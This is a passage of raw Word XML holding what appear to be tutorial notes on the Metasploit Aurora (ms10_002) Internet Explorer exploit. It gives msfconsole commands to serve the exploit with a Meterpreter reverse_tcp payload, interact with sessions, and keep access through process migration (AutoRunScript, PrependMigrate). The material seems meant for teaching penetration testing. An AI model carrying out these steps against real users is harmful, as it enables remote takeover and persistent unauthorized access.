          <w:rStyle w:val="Strong"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Metasploit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>bash</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>CopyEdit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B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msf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
        <w:t xml:space="preserve"> &gt; use exploit/windows/browser/ms10_002_aurora</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B3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SRVHOST</w:t>
      </w:r>
      <w:r>
        <w:t>: Local IP of attacker’s machine</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">e.g., </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>set SRVHOST 192.168.20.9</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B3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SRVPORT</w:t>
      </w:r>
      <w:r>
        <w:t>: Port for web server (default = 8080)</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">Change to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>80</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> if unused</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B3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URIPATH</w:t>
      </w:r>
      <w:r>
        <w:t>: Optional custom path for malicious URL</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>(leave empty for random)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B3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PAYLOAD</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Example – </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>windows/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>meterpreter</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>reverse_tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>bash</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>CopyEdit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B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msf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
        <w:t xml:space="preserve"> exploit(ms10_002_aurora) &gt; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="hljs-builtin"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
        </w:rPr>
        <w:t>set</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
        <w:t xml:space="preserve"> SRVHOST 192.168.20.9</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
      </w:pPr>
      <w:r>
        <w:t>Once run:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B3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malicious web server</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is started</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B3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handler</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> for the reverse shell is launched</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33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9F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        </w:rPr>
        <w:t>🧪</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Execution</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B3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Victim (Windows XP with IE) browses the malicious URL.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B3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If vulnerable</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
        </w:rPr>
        <w:t>Meterpreter</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
        </w:rPr>
        <w:t xml:space="preserve"> session</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> opens.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B3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To interact:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>bash</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>CopyEdit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33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sessions</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
        <w:t xml:space="preserve"> -i &lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
        <w:t>session_id</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
        <w:t>&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:r>
        <w:pict>
          <v:rect id="_x0000_i1029" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        </w:rPr>
        <w:t>❌</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Session Loss</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B3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Problem</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Closing the browser = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Meterpreter</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> session ends</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B3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Need to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
        </w:rPr>
        <w:t>persist the session</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> even if IE crashes</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33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9F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>🔁</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Handling Session Persistence</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B3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List background jobs</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>bash</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>CopyEdit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="hljs-builtin"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
        </w:rPr>
        <w:t>jobs</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B3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Stop running exploit job</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>bash</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>CopyEdit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="hljs-builtin"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
        </w:rPr>
        <w:t>kill</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
        <w:t xml:space="preserve"> &lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
        <w:t>job_number</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
        <w:t>&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:r>
        <w:pict>
          <v:rect id="_x0000_i1031" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        </w:rPr>
        <w:t>🔄</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Migrate Session to Stable Process</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33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rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>migrate.rb</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Meterpreter</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> script to shift from </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>iexplore.exe</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to another process</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>bash</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>CopyEdit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B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meterpreter</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
        <w:t xml:space="preserve"> &gt; run migrate</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
      </w:pPr>
      <w:r>
        <w:t>Options:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B3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-f</w:t>
      </w:r>
      <w:r>
        <w:t>: Create new process and migrate into it (e.g., notepad.exe)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B3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-n &lt;name&gt;</w:t>
      </w:r>
      <w:r>
        <w:t>: Migrate into process by name</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B3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-p &lt;PID&gt;</w:t>
      </w:r>
      <w:r>
        <w:t>: Migrate into specific process ID</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33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9F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        </w:rPr>
        <w:t>⚙️</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Automate Migration with </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>AutoRunScript</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33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View advanced options:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>bash</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>CopyEdit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33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show</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
        <w:t xml:space="preserve"> advanced</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33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Set </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>AutoRunScript</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> to execute </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>migrate</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> script:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>bash</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>CopyEdit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="hljs-builtin"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
        </w:rPr>
        <w:t>set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AutoRunScript</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
        <w:t xml:space="preserve"> migrate -f</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33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This </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
        </w:rPr>
        <w:t>automatically migrates</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Meterpreter</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> session once opened</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33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9F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>✅</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Improved Stability with </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>PrependMigrate</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33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Alternative to </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>AutoRunScript</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>bash</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>CopyEdit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="hljs-builtin"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
        </w:rPr>
        <w:t>set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PrependMigrate</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="hljs-literal"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
        </w:rPr>
        <w:t>true</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33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Initiates migration </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Emphasis"/>
        </w:rPr>
        <w:t>before</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> payload execution, increasing stability</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33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9F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        </w:rPr>
        <w:t>📌</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Conclusion</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33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Aurora exploit shows </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
        </w:rPr>
        <w:t>client-side vulnerabilities</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> are dangerous.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRPr="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B3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or-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009F5B33">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:bidi="or-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">With proper </w:t>
      </w:r>
      <w:r w:rsidRPr="009F5B33">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:bidi="or-IN"/>
        </w:rPr>
        <w:t>persistence mechanisms</w:t>
      </w:r>
      <w:r w:rsidRPr="009F5B33">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:bidi="or-IN"/>
        </w:rPr>
        <w:t>, attackers can maintain access.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRPr="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B3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or-IN"/>
